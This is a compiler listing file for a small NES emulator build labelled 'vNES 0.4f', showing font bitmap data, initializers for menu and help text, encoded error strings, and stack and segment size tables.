   \   00000268   000068545454       DC8 0, 0, 68H, 54H, 54H, 54H, 54H, 0
   \              5400        
   \   00000270   000078444444       DC8 0, 0, 78H, 44H, 44H, 44H, 44H, 0
   \              4400        
   \   00000278   000038444444       DC8 0, 0, 38H, 44H, 44H, 44H, 38H, 0
   \              3800        
   \   00000280   000078444478       DC8 0, 0, 78H, 44H, 44H, 78H, 40H, 40H
   \              4040        
   \   00000288   00003C44443C       DC8 0, 0, 3CH, 44H, 44H, 3CH, 4, 6
   \              0406        
   \   00000290   00001C202020       DC8 0, 0, 1CH, 20H, 20H, 20H, 20H, 0
   \              2000        
   \   00000298   000038403804       DC8 0, 0, 38H, 40H, 38H, 4, 78H, 0
   \              7800        
   \   000002A0   001038101010       DC8 0, 10H, 38H, 10H, 10H, 10H, 0CH, 0
   \              0C00        
   \   000002A8   000044444444       DC8 0, 0, 44H, 44H, 44H, 44H, 38H, 0
   \              3800        
   \   000002B0   000044442828       DC8 0, 0, 44H, 44H, 28H, 28H, 10H, 0
   \              1000        
   \   000002B8   000044545454       DC8 0, 0, 44H, 54H, 54H, 54H, 28H, 0
   \              2800        
   \   000002C0   000044281028       DC8 0, 0, 44H, 28H, 10H, 28H, 44H, 0
   \              4400        
   \   000002C8   00004444443C       DC8 0, 0, 44H, 44H, 44H, 3CH, 4, 38H
   \              0438        
   \   000002D0   00007C081020       DC8 0, 0, 7CH, 8, 10H, 20H, 7CH, 0
   \              7C00        
   \   000002D8   000E08300808       DC8 0, 0EH, 8, 30H, 8, 8, 0EH, 0
   \              0E00        
   \   000002E0   000808080808       DC8 0, 8, 8, 8, 8, 8, 8, 0
   \              0800        
   \   000002E8   0070100C1010       DC8 0, 70H, 10H, 0CH, 10H, 10H, 70H, 0
   \              7000        
   \   000002F0   001428000000       DC8 0, 14H, 28H, 0, 0, 0, 0, 0
   \              0000        
   \   000002F8   3C4299A1A199       DC8 3CH, 42H, 99H, 0A1H, 0A1H, 99H, 42H, 3CH
   \              423C        
   \   00000300   00                 DC8 0
   \   00000301   000000             DC8 0, 0, 0

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for param>`:
   \   00000000   260500000000       DC8 26H, 5, 0, 0, 0, 0, 84H, 0B0H
   \              84B0        
   \   00000008   000008000000       DC8 0, 0, 8, 0, 0, 0, 0, 0
   \              0000        
   \   00000010   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000018   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000020   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000028   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000030   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000038   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000040   3D3E3B3C2A23       DC8 3DH, 3EH, 3BH, 3CH, 2AH, 23H, 34H, 36H
   \              3436        
   \   00000048   3238351A3133       DC8 32H, 38H, 35H, 1AH, 31H, 33H, 37H, 39H
   \              3739        
   \   00000050   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000058   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000060   408010201020       DC8 40H, 80H, 10H, 20H, 10H, 20H, 40H, 80H
   \              4080        
   \   00000068   102008010804       DC8 10H, 20H, 8, 1, 8, 4, 1, 2
   \              0102        
   \   00000070   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000078   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000080   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000088   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000090   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   00000098   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000A0   3D3E3B3C2A23       DC8 3DH, 3EH, 3BH, 3CH, 2AH, 23H, 34H, 36H
   \              3436        
   \   000000A8   3238351A3133       DC8 32H, 38H, 35H, 1AH, 31H, 33H, 37H, 39H
   \              3739        
   \   000000B0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000B8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000C0   408010201020       DC8 40H, 80H, 10H, 20H, 10H, 20H, 40H, 80H
   \              4080        
   \   000000C8   102008010804       DC8 10H, 20H, 8, 1, 8, 4, 1, 2
   \              0102        
   \   000000D0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000D8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000E0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000E8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000F0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \   000000F8   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0
   \              0000        
   \                     `?<Initializer for mode>`:
   \   00000100   00000000           DC32 0
   \                     `?<Initializer for running>`:
   \   00000104   00000000           DC32 0
   \                     `?<Initializer for exit>`:
   \   00000108   00000000           DC32 0
   \                     `?<Initializer for joy>`:
   \   0000010C   00000000           DC32 0
   \                     `?<Initializer for menu>`:
   \   00000110   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000120   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000130   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000140   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000150   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000160   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000170   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000180   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000190   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001A0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001B0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001C0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001D0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001E0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000001F0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000200   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \                     `?<Initializer for filename>`:
   \   00000210   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000220   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000230   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000240   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000250   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000260   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000270   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000280   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \                     `?<Initializer for romname>`:
   \   00000290   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002A0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002B0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002C0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002D0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002E0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   000002F0   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000300   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000310   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000320   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000330   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000340   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000350   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000360   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000370   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \   00000380   000000000000       DC8 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   \              000000000000
   \              00000000    
   \                     `?<Initializer for help>`:
   \   00000390   20764E455320       DC8 20H, 76H, 4EH, 45H, 53H, 20H, 30H, 2EH
   \              302E        
   \   00000398   346620286329       DC8 34H, 66H, 20H, 28H, 63H, 29H, 62H, 6EH
   \              626E        
   \   000003A0   0A312E4C6F61       DC8 0AH, 31H, 2EH, 4CH, 6FH, 61H, 64H, 20H
   \              6420        
   \   000003A8   302D390A322E       DC8 30H, 2DH, 39H, 0AH, 32H, 2EH, 53H, 61H
   \              5361        
   \   000003B0   766520302D39       DC8 76H, 65H, 20H, 30H, 2DH, 39H, 0AH, 33H
   \              0A33        
   \   000003B8   2E46726D536B       DC8 2EH, 46H, 72H, 6DH, 53H, 6BH, 70H, 20H
   \              7020        
   \   000003C0   312D393A2564       DC8 31H, 2DH, 39H, 3AH, 25H, 64H, 0AH, 34H
   \              0A34        
   \   000003C8   2E4F7074696D       DC8 2EH, 4FH, 70H, 74H, 69H, 6DH, 69H, 7AH
   \              697A        
   \   000003D0   653A25640A35       DC8 65H, 3AH, 25H, 64H, 0AH, 35H, 2EH, 52H
   \              2E52        
   \   000003D8   65646566696E       DC8 65H, 64H, 65H, 66H, 69H, 6EH, 65H, 0AH
   \              650A        
   \   000003E0   362E5175616C       DC8 36H, 2EH, 51H, 75H, 61H, 6CH, 69H, 74H
   \              6974        
   \   000003E8   793A25640A37       DC8 79H, 3AH, 25H, 64H, 0AH, 37H, 2EH, 53H
   \              2E53        
   \   000003F0   637253746570       DC8 63H, 72H, 53H, 74H, 65H, 70H, 3AH, 25H
   \              3A25        
   \   000003F8   3032640A382E       DC8 30H, 32H, 64H, 0AH, 38H, 2EH, 53H, 69H
   \              5369        
   \   00000400   7A65583A2530       DC8 7AH, 65H, 58H, 3AH, 25H, 30H, 33H, 64H
   \              3364        
   \   00000408   0A392E53697A       DC8 0AH, 39H, 2EH, 53H, 69H, 7AH, 65H, 59H
   \              6559        
   \   00000410   3A253033640A       DC8 3AH, 25H, 30H, 33H, 64H, 0AH, 30H, 2EH
   \              302E        
   \   00000418   457869740A63       DC8 45H, 78H, 69H, 74H, 0AH, 63H, 62H, 6EH
   \              626E        
   \   00000420   2E6E61726F64       DC8 2EH, 6EH, 61H, 72H, 6FH, 64H, 2EH, 72H
   \              2E72        
   \   00000428   750A63626E40       DC8 75H, 0AH, 63H, 62H, 6EH, 40H, 79H, 61H
   \              7961        
   \   00000430   6E6465782E72       DC8 6EH, 64H, 65H, 78H, 2EH, 72H, 75H, 0
   \              7500        

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for Title>`:
   \   00000000   ........           DC32 `?<Constant "vNES 0.4f (c)bn">`

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for errors>`:
   \   00000000   00000000....       DC32 0H, `?<Constant "\\307\\340\\357\\363\\361\\362\\350\\362\\3`
   \              ....        
   \   00000008   ........           DC32 `?<Constant "Unknown error\\000">`
   \   0000000C   ........           DC32 `?<Constant "\\315\\345 \\354\\356\\343\\363 \\356\\362`
   \   00000010   ........           DC32 `?<Constant "\\315\\345 .Nes \\360\\356\\354!\\000">`
   \   00000014   ........           DC32 `?<Constant "\\314\\340\\357\\357\\345\\360 \\355\\345 `
   \   00000018   ........           DC32 `?<Constant "\\315\\345\\342\\345\\360\\355\\373\\351 \\`

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "vNES 0.4f (c)bn">`:
   \   00000000   764E45532030       DC8 "vNES 0.4f (c)bn"
   \              2E3466202863
   \              29626E00    

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\307\\340\\357\\363\\361\\362\\350\\362\\3`:
   \   00000000   C7E0EFF3F1F2       DC8 0C7H, 0E0H, 0EFH, 0F3H, 0F1H, 0F2H, 0E8H, 0F2H
   \              E8F2        
   \   00000008   E5202E6E6573       DC8 0E5H, 20H, 2EH, 6EH, 65H, 73H, 20H, 0F4H
   \              20F4        
   \   00000010   E0E9EB0000         DC8 0E0H, 0E9H, 0EBH, 0, 0
   \   00000015   000000             DC8 0, 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "Unknown error\\000">`:
   \   00000000   556E6B6E6F77       DC8 55H, 6EH, 6BH, 6EH, 6FH, 77H, 6EH, 20H
   \              6E20        
   \   00000008   6572726F7200       DC8 65H, 72H, 72H, 6FH, 72H, 0, 0
   \              00          
   \   0000000F   00                 DC8 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\315\\345 \\354\\356\\343\\363 \\356\\362`:
   \   00000000   CDE520ECEEE3       DC8 0CDH, 0E5H, 20H, 0ECH, 0EEH, 0E3H, 0F3H, 20H
   \              F320        
   \   00000008   EEF2EAF0FBF2       DC8 0EEH, 0F2H, 0EAH, 0F0H, 0FBH, 0F2H, 0FCH, 20H
   \              FC20        
   \   00000010   F4E0E9EB0000       DC8 0F4H, 0E0H, 0E9H, 0EBH, 0, 0
   \   00000016   0000               DC8 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\315\\345 .Nes \\360\\356\\354!\\000">`:
   \   00000000   CDE5202E4E65       DC8 0CDH, 0E5H, 20H, 2EH, 4EH, 65H, 73H, 20H
   \              7320        
   \   00000008   F0EEEC210000       DC8 0F0H, 0EEH, 0ECH, 21H, 0, 0
   \   0000000E   0000               DC8 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\314\\340\\357\\357\\345\\360 \\355\\345 `:
   \   00000000   CCE0EFEFE5F0       DC8 0CCH, 0E0H, 0EFH, 0EFH, 0E5H, 0F0H, 20H, 0EDH
   \              20ED        
   \   00000008   E520EFEEE4E4       DC8 0E5H, 20H, 0EFH, 0EEH, 0E4H, 0E4H, 0E5H, 0F0H
   \              E5F0        
   \   00000010   E6E8E2E0E5F2       DC8 0E6H, 0E8H, 0E2H, 0E0H, 0E5H, 0F2H, 0F1H, 0FFH
   \              F1FF        
   \   00000018   2E0000             DC8 2EH, 0, 0
   \   0000001B   00                 DC8 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "\\315\\345\\342\\345\\360\\355\\373\\351 \\`:
   \   00000000   CDE5E2E5F0ED       DC8 0CDH, 0E5H, 0E2H, 0E5H, 0F0H, 0EDH, 0FBH, 0E9H
   \              FBE9        
   \   00000008   20F0EEEC2100       DC8 20H, 0F0H, 0EEH, 0ECH, 21H, 0, 0
   \              00          
   \   0000000F   00                 DC8 0

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant ".ini">`:
   \   00000000   2E696E6900         DC8 ".ini"
   \   00000005   000000             DC8 0, 0, 0
    447          //напутал....экран
    448          //        int i1 = getWidth;
    449          //        int j1 = getHeight;
    450          //        if(i1 != t_int_static_fld || j1 != K)
    451          //            i();
    452          //        t_int_static_fld = i1;
    453          //        K = j1;

   Maximum stack usage in bytes:

     Function      CSTACK
     --------      ------
     drawhelp         16
     drawsym           8
     getscrXY         12
     isFreeRam         0
     keyboard_init     8
     keypress         12
     loadini          20
     onclose           4
     oncreate          4
     onexit            4
     onkey             4
     onredraw          8
     onredslow        32
     onstart          12
     outmenu          20
     repaint           4
     saveini          16
     savename          8


   Segment part sizes:

     Function/Label                 Bytes
     --------------                 -----
     zfont                           772
     file                              4
     redefineptr                       4
     keyboard_init                    44
     drawsym                         124
     drawhelp                        164
     loadini                         152
     saveini                         120
     isFreeRam                        28
     keypress                        104
     plus                              4
     LastTmrVal                        4
     tmpsize                           4
     repaint                          12
     helpsel                          80
     version                           1
     param                          1080
     Title                             4
     errors                           28
     outmenu                          76
     onredslow                       180
     onredraw                        212
     getscrXY                        232
     savename                         52
     onkey                           108
     onclose                          72
     onexit                            4
     oncreate                         48
     onstart                         192
     ??DataTable9                      4
     ??DataTable25                     4
     ??DataTable36                     4
     ??DataTable37                     4
     ??DataTable38                     4
     ??DataTable39                     4
     ??DataTable40                     4
     ??DataTable42                     4
     ??DataTable43                     4
     ??DataTable46                     4
     ??DataTable47                     4
     ??DataTable48                     4
     ??DataTable49                     4
     ??DataTable50                     4
     ?<Initializer for zfont>        772
     ?<Initializer for param>       1080
     ?<Initializer for Title>          4
     ?<Initializer for errors>        28
     ?<Constant "vNES 0.4f (c)bn">    16
     ?<Constant "\307\340\357\363\361\362\350\362\3
                                      24
     ?<Constant "Unknown error\000">
                                      16
     ?<Constant "\315\345 \354\356\343\363 \356\362
                                      24
     ?<Constant "\315\345 .Nes \360\356\354!\000">
                                      16
     ?<Constant "\314\340\357\357\345\360 \355\345
                                      28
     ?<Constant "\315\345\342\345\360\355\373\351 \
                                      16
     ?<Constant ".ini">                8
      Others                         240

 
 2 196 bytes in segment CODE
   229 bytes in segment DATA_C
 1 884 bytes in segment DATA_I
 1 884 bytes in segment DATA_ID
    20 bytes in segment DATA_Z
    24 bytes in segment INITTAB
 
 1 980 bytes of CODE  memory (+ 240 bytes shared)
 2 113 bytes of CONST memory
 1 904 bytes of DATA  memory

Errors: none
Warnings: 4
